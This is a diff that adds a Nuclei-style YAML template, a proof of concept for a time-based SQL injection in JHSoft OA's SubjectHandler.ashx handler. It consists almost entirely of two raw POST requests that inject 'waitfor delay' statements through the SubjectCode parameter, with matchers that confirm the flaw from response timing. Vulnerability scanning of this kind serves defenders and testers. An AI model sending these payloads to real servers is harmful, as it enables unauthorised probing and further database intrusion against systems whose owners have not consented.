@@ -1,0 +1,35 @@
+id: poc-yaml-jinher-jhsoft-subjecthandler-ashx-sqli
+info:
+  name: "JHSoft SubjectHandler.ashx SQL注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: JHSoft OA
+  metadata:
+    product: JHSoft OA
+
+http:
+  - raw:
+      - |
+        POST /c6/JHSoft.Web.CostControl/subClass/Handlers/SubjectHandler.ashx?SubjectCode=1'waitfor+delay%270:0:5%27--&Action=updateactive HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 0
+
+      - |
+        POST /c6/JHSoft.Web.CostControl/subClass/Handlers/SubjectHandler.ashx?SubjectCode=1'waitfor+delay%270:0:8%27--&Action=updateactive HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 0
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '{"result":false}'
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
